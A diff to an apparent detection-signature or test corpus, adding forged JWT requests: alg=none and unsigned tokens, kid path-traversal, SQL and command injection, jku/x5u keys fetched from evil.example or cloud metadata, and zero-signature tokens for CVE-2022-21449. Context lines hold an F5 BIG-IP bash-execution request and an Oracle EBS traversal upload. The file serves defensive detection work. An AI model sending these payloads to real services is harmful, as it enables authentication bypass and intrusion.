@@ -461,6 +461,72 @@ GET /notes.swo
 GET /db.backup
 GET /old-config.old
 
+# --- JSON Web Token attacks: unsecured (alg=none) headers, tokens with no
+#     signature, and key-lookup injection through kid/jku/x5u/x5c. Tokens are
+#     written the way jwt_tool, Burp JWT Editor, and the public PoCs emit them;
+#     base64url hides the payload from regex inspection, so the signatures
+#     cover the canonical serializations. The limitations note closes the
+#     section. ---
+# alg=none with a dummy signature, an empty signature (trailing dot), and no
+# signature at all.
+GET /api/me header="Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
+GET /api/me header="Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9"
+# Header serializations: typ before or after alg, a space after the colon, and
+# capitalized alg values.
+GET /api/me header="Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiAibm9uZSJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJOb25lIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJOT05FIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJuT25FIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+# A standard HS256 header with the signature segment left empty.
+GET /api/admin header="Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9."
+# The unsecured token presented in a cookie, a query parameter, and a form body.
+GET /api/me header="Cookie: session=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me?access_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.x
+POST /api/auth body="token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+# An unencoded header object in a JSON body, for decoders that accept the
+# protected header as data.
+POST /api/token body="{\"alg\":\"none\",\"typ\":\"JWT\",\"sub\":\"admin\"}"
+
+# --- kid injection: path traversal, SQLi, command injection, and remote or
+#     file key material. ---
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJraWQiOiIuLi8uLi8uLi8uLi94IiwiYWxnIjoiSFMyNTYifQ.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS8uLi8uLi9ldGMvcGFzc3dkIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFhYScgVU5JT04gU0VMRUNUICdzZWNyZXQnLS0gLSJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleXxpZCJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InxpZCJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHA6Ly9ldmlsLmV4YW1wbGUva2V5In0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImZpbGU6Ly8vZXRjL3Bhc3N3ZCJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleVx1MDAwMCJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+
+# --- jku, jwk, x5u, and x5c point verification at attacker-controlled key
+#     material. ---
+GET /api/me header="Authorization: Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5leGFtcGxlL2p3a3MuanNvbiJ9.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsImprdSI6Imh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS8ifQ.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiQVFBQiIsImUiOiJBUUFCIn19.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5leGFtcGxlL2NlcnQucGVtIn0.eyJzdWIiOiJhZG1pbiJ9.x"
+GET /api/me header="Authorization: Bearer eyJhbGciOiJSUzI1NiIsIng1YyI6WyJNSUlDYWpDQ0FWS2dBd0lCQWdJVWRHVnpkQSJdfQ.eyJzdWIiOiJhZG1pbiJ9.x"
+
+# --- JWT attack classes left out ---
+# Algorithm confusion (an RS256 token accepted after re-signing the public key
+#   as an HMAC secret) and claim tampering have no static request shape;
+#   signature and claim validation belong to the application.
+# Weak-secret and default-secret re-signing is detectable only through known
+#   public default tokens (CVE entries elsewhere in this file); arbitrary
+#   forgery is not.
+# Replay, expiry, and key-rotation abuse need server state, not a request
+#   signature.
+# JWE zip bombs and crit header abuse live inside the encrypted token and cannot
+#   be inspected as a request.
+
 # ---------------------------------------------------------------------------
 # 2025 CVEs: attacks against HTTP servers and web frameworks.
 #
@@ -3192,6 +3258,12 @@ GET /%2e%2e/conf/config.properties
 # --- CVE-2022-1388 (F5 BIG-IP iControl REST: unauthenticated bash endpoint) ---
 POST /mgmt/tm/util/bash header="Connection: keep-alive, X-F5-Auth-Token" header="X-F5-Auth-Token: a" header="Authorization: Basic YWRtaW46YWRtaW4=" header="Content-Type: application/json" body="{\"command\": \"run\", \"utilCmdArgs\": \"-c 'id'\"}"
 POST /mgmt/tm/util/bash header="Connection: keep-alive, X-F5-Auth-Token" header="X-F5-Auth-Token: a" header="Authorization: Basic YWRtaW46YWRtaW4=" header="Content-Type: application/json" body="{\"command\": \"run\", \"utilCmdArgs\": \"-c 'cat /etc/passwd'\"}"
+
+# --- CVE-2022-21449 (Java 15-18 ECDSA "Psychic Signatures"): the verify path
+#     accepts an all-zero signature, so any claims validate; the public PoC
+#     signature MAYCAQACAQA is a DER SEQUENCE of two zero INTEGERs. ---
+GET /api/me header="Authorization: Bearer eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA"
+GET /api/admin header="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.MAYCAQACAQA"
 
 # --- CVE-2022-21587 (Oracle E-Business Suite: BneOfflineLOVService upload) ---
 POST /OA_HTML/BneOfflineLOVService?bne:uueupload=true header="Content-Type: multipart/form-data; boundary=x" body="Content-Disposition: form-data; name=\"uploadfilename\";filename=\"../../OA_HTML/pwn.jsp\""
